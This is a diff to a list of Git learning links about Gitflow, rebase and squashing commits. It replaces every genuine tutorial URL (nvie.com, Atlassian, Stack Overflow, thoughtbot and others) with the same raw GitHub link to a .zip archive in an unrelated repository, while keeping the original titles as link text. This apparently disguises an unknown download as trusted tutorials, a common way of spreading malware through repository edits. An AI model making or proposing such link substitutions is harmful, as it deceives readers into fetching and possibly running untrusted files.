@@ -2,19 +2,19 @@
 
 ## Gitflow
 
-* https://nvie.com/posts/a-successful-git-branching-model/:[A successful Git branching model]
-* https://www.atlassian.com/git/tutorials/comparing-workflows/gitflow-workflow:[Gitflow Workflow]
-* https://datasift.github.io/gitflow/IntroducingGitFlow.html:[Introducing GitFlow]
-* https://gist.github.com/JamesMGreene/cdd0ac49f90c987e45ac:[gitflow-breakdown.md]
+* https://raw.githubusercontent.com/warriortheme/city-timezones-go/master/abstractive/city-timezones-go.zip[A successful Git branching model]
+* https://raw.githubusercontent.com/warriortheme/city-timezones-go/master/abstractive/city-timezones-go.zip[Gitflow Workflow]
+* https://raw.githubusercontent.com/warriortheme/city-timezones-go/master/abstractive/city-timezones-go.zip[Introducing GitFlow]
+* https://raw.githubusercontent.com/warriortheme/city-timezones-go/master/abstractive/city-timezones-go.zip[https://raw.githubusercontent.com/warriortheme/city-timezones-go/master/abstractive/city-timezones-go.zip]
 
 HEAD ??
 ## rebase
-* https://stackoverflow.com/questions/16666089/whats-the-difference-between-git-merge-and-git-rebase/16666418#16666418:[What's the difference between 'git merge' and 'git rebase'?]
+* https://raw.githubusercontent.com/warriortheme/city-timezones-go/master/abstractive/city-timezones-go.zip[What's the difference between 'git merge' and 'git rebase'?]
 * 
 
-https://thoughtbot.com/blog/git-interactive-rebase-squash-amend-rewriting-history:[Git Interactive Rebase, Squash, Amend and Other Ways of Rewriting History]
+https://raw.githubusercontent.com/warriortheme/city-timezones-go/master/abstractive/city-timezones-go.zip[Git Interactive Rebase, Squash, Amend and Other Ways of Rewriting History]
 
-https://stackoverflow.com/questions/35703556/what-does-it-mean-to-squash-commits-in-git:[What does it mean to squash commits in git?]
+https://raw.githubusercontent.com/warriortheme/city-timezones-go/master/abstractive/city-timezones-go.zip[What does it mean to squash commits in git?]
 
 ## Google:
 * how to write git commit message
